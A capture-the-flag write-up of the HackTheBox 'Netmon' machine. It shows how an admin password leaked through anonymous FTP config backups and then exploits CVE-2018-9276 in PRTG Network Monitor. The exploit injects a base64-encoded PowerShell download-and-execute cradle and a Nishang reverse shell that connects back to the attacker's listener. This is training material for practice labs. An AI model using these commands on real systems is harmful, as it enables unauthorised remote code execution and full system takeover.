---
layout: post
title: "HackTheBox - Netmon"
date: 2022-05-03 20:50:00 +0100
tags: RCE
---
**Difficulty: <span style="color:green">Easy</span>**  
**Personal Difficulty: <span style="color:green">Easy</span>**  
**Rating: 3.9 / 5**  

After wasting my time during my first attempt at this box, I finally came back to it. There were some
tricky parts and people resetting the password during the completion of this box (happened both times I
attempted it)  but overall it was pretty easy. The key was enumeration, as is the success factor for owning most machines. 
An FTP server holding some sensitive info became the downfall of this machine.  

## Enumeration

### Port Scan

I started with a nmap scan as always:  
```bash
nmap -sC -sV -oN scan.nmap
```

	Nmap scan report for 10.10.10.152
	Host is up (0.018s latency).
	Not shown: 995 closed tcp ports (conn-refused)
	PORT    STATE SERVICE      VERSION
	21/tcp  open  ftp          Microsoft ftpd
	| ftp-syst: 
	|_  SYST: Windows_NT
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| 02-03-19  12:18AM                 1024 .rnd
	| 02-25-19  10:15PM       <DIR>          inetpub
	| 07-16-16  09:18AM       <DIR>          PerfLogs
	| 02-25-19  10:56PM       <DIR>          Program Files
	| 02-03-19  12:28AM       <DIR>          Program Files (x86)
	| 02-03-19  08:08AM       <DIR>          Users
	|_02-25-19  11:49PM       <DIR>          Windows
	80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
	|_http-trane-info: Problem with XML parsing of /evox/about
	| http-title: Welcome | PRTG Network Monitor (NETMON)
	|_Requested resource was /index.htm
	|_http-server-header: PRTG/18.1.37.13946
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

	Host script results:
	| smb2-time: 
	|   date: 2022-05-03T19:55:49
	|_  start_date: 2022-05-03T19:45:41
	| smb-security-mode: 
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   3.1.1: 
	|_    Message signing enabled but not required
	|_clock-skew: mean: -1s, deviation: 0s, median: -2s


The machine was running FTP, HTTP and SMB. On the web, it's running a software called PRTG Network monitor by Paessler,
and the version (18.1.37.13946) is given to me too which is nice.  

### Accessing configuration files

I decided to check out the FTP files first, since we can login as anonymous. There are certain folders that it's best to look through while enumerating,
especially when there's foreign software being run (e.g. to find configuration files). 

	ftp 10.10.10.152
	Connected to 10.10.10.152.
	220 Microsoft FTP Service
	Name (10.10.10.152:infiltr8): anonymous
	331 Anonymous access allowed, send identity (e-mail name) as password.
	Password: 
	230 User logged in.
	Remote system type is Windows_NT.
	ftp> ls
	229 Entering Extended Passive Mode (|||50634|)
	150 Opening ASCII mode data connection.
	02-03-19  12:18AM                 1024 .rnd
	02-25-19  10:15PM       <DIR>          inetpub
	07-16-16  09:18AM       <DIR>          PerfLogs
	02-25-19  10:56PM       <DIR>          Program Files
	02-03-19  12:28AM       <DIR>          Program Files (x86)
	02-03-19  08:08AM       <DIR>          Users
	02-25-19  11:49PM       <DIR>          Windows
	226 Transfer complete.

Nothing seemed interesting on the server. Even a PRTG Configuration file I found in the Windows directory seemed useless, as it looked like credentials were 
missing from it.  

The ProgramData folder is a hidden folder which stores extra data for installed programs. I decided to enumerate this. It is
located in the root directory. 

	ftp> cd ProgramData
	250 CWD command successful.
	ftp> dir
	229 Entering Extended Passive Mode (|||50727|)
	150 Opening ASCII mode data connection.
	12-15-21  10:40AM       <DIR>          Corefig
	02-03-19  12:15AM       <DIR>          Licenses
	11-20-16  10:36PM       <DIR>          Microsoft
	02-03-19  12:18AM       <DIR>          Paessler
	.
	.
	.

There is a Paessler directory in here. Maybe it has some config files.

	ftp> cd Paessler
	250 CWD command successful.
	ftp> ls
	229 Entering Extended Passive Mode (|||50753|)
	150 Opening ASCII mode data connection.
	05-03-22  05:29PM       <DIR>          PRTG Network Monitor
	226 Transfer complete.
	ftp> cd PRTG\ Network\ Monitor
	250 CWD command successful.
	ftp> ls
	229 Entering Extended Passive Mode (|||50755|)
	150 Opening ASCII mode data connection.
	12-15-21  08:23AM       <DIR>          Configuration Auto-Backups
	05-03-22  04:43PM       <DIR>          Log Database
	02-03-19  12:18AM       <DIR>          Logs (Debug)
	02-03-19  12:18AM       <DIR>          Logs (Sensors)
	02-03-19  12:18AM       <DIR>          Logs (System)
	05-03-22  04:43PM       <DIR>          Logs (Web Server)
	12-15-21  08:19AM       <DIR>          Monitoring Database
	05-03-22  05:24PM              1200909 PRTG Configuration.dat
	05-03-22  05:12PM              1200906 PRTG Configuration.old
	07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
	05-03-22  05:29PM              1671421 PRTG Graph Data Cache.dat
	02-25-19  11:00PM       <DIR>          Report PDFs
	02-03-19  12:18AM       <DIR>          System Information Database
	02-03-19  12:40AM       <DIR>          Ticket Database
	02-03-19  12:18AM       <DIR>          ToDo Database

There are 3 config files. One of them looks like the one I already found in the Windows directory, but the
other two are marked as 'old'. I brought them back to my local machine anyway with `get`:

	ftp> get PRTG\ Configuration.old
	.
	.
	.
	ftp> get PRTG\ Configuration.old.bak

After this, I went on to try to connect via SMB, but we were denied directory listing.  

## Exploring the Website

On visiting `http://10.10.10.152` we are greeted with a login page:

![Netmon Login Page](/assets/netmon-htb/login-page.png)

By habit, I ran a gobuster (directory) brute force but found nothing of use.  

Since we have the specific name of the service running on the machine (PRTG Network Monitor) and version (see bottom of
page in the screenshot), I decided to google search for any vulnerabilities or default logins.  

The default login for PRTG Network Monitor is 'prtgadmin' and password 'prtgadmin'. I tried these credentials but they didn't work.  

So I went to the 'Forgot Password?' page, and typed prtgadmin for the username.

![Forgot Password Page](/assets/netmon-htb/forgot-pw.png)

We can assume that an account with the username 'prtgadmin' exists. To prove, I typed in a random name and the response was 
'sorry, this account is unknown.' Since I still have the config files from the ftp server, I decided to search them through
for prtgadmin, now that I've got something to filter the information by. Using nano to view the file then `Ctrl+W` to search
for a term:

```html
</dbcredentials>
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
<dbtimeout>
```

This looks like a password...  

However, I tried it on the site and it didn't work.  
I tried 2022 instead of 2018, since this is the year that I'm writing the box in. Of course it didn't work. But it inspired an
idea. When a ran `ls -al`:

```bash
-rw-r--r--  1 infiltr8 infiltr8 1159598 Feb 26  2019 'PRTG Configuration.dat'
.
.
-rw-r--r--  1 infiltr8 infiltr8 1124497 Jul 14  2018 'PRTG Configuration.old.bak'
```

Notice that the created dates are different for the new and old files. This hints that the password could have been updated, especially
due to the fact that we found it in an old configuration file. I decided to try `PrTg@dmin2019` as the password. Thankfully it worked:

![PRTG Admin Panel](/assets/netmon-htb/admin-panel.png)

## Exploiting CVE-2018-9276

We are admin of the site now.  
During the search that led me to find the default credentials `prtgadmin`, I also found a vulnerability for that specific version of PRTG Netmon.  
The full CVE details are [here](https://nvd.nist.gov/vuln/detail/CVE-2018-9276).  
 
I came across a [Github repo](https://github.com/A1vinSmith/CVE-2018-9276) which had some really useful info on this CVE and an exploit script.
However, I decided to follow the manual exploit as explained in the repo. This involves invoking an instance of powershell for us via the 
Notifications section of the site (Setup > Account Settings > Notifications). We can set up several types of notifications. There is one in particular
which allows us to execute a program.  

On the far right of the Notifications page, there is a ' + ' sign to add a new notification. Scroll down and turn on the Execute Program Switch.
Select the powershell outfile under the Program File option. According to the CVE, the 'parameter' option is vulnerable to arbitary RCE.  
 
Following the Github repo, it seems like we can do so by specifying a filename e.g. abc.txt , followed by a pipe `|`, finally `powershell -enc ` + our 
encoded malicious command.  

![Notification Parameter](/assets/netmon-htb/notification.png)



## <span style="color:red">Shell as Root</span>


The repo gave us a useful file fetching payload, which we will use to fetch a script that executes a reverse shell and invokes an instance of PS for us.
Here is how we'll use it:

```bash
$ echo -n "IEX(new-object net.webclient).downloadstring('http://[MY-IP-ADDRESS]/Invoke-PowerShellTcp.ps1' )" | iconv -t UTF-16LE | base64 -w0
SQBFAFgAKABuAGUAdwAtAG8AYgBq...wAHMAMQAnACAAKQA=

$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
.
.
$ echo "Invoke-PowerShellTcp -Reverse -IPAddress [MY-IP-ADDRESS] -Port 4444" >> Invoke-PowerShellTcp.ps1

$ python -m http.server 80 #in the same directory as the script we just fetched
```

Now just to set up input the encoded string into the notification parameter, then set up a netcat listener:

![exploit](/assets/netmon-htb/exploit.png)

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
```
Save the notification and exit. In the Notifications tab, the name of your notification (you may have left it as 'Notification') should be listed among
others. There is a small edit icon on the end of your notification. Making sure you have your netcat listener up, press 'send test notification', aka
the bell icon. You should get a connection back to yourself: 


	connect to [10.10.14.21] from (UNKNOWN) [10.10.10.152] 50246
	Windows PowerShell running as user NETMON$ on NETMON
	Copyright (C) 2015 Microsoft Corporation. All rights reserved.


	PS C:\Windows\system32>whoami       
	nt authority\system


We got shell as root!
Now we can capture both flags, root is in `C:\Users\Administrator\Desktop` and user flag is in `C:\Users\Public`.

                                                                                                                                                                     
	PS C:\Windows\system32> cd C:\Users\Administrator
	PS C:\Users\Administrator> cd Desktop
	PS C:\Users\Administrator\Desktop> dir


             Directory: C:\Users\Administrator\Desktop


	Mode                LastWriteTime         Length Name                          
	----                -------------         ------ ----                          
	-ar---         5/6/2022   6:07 PM             34 root.txt
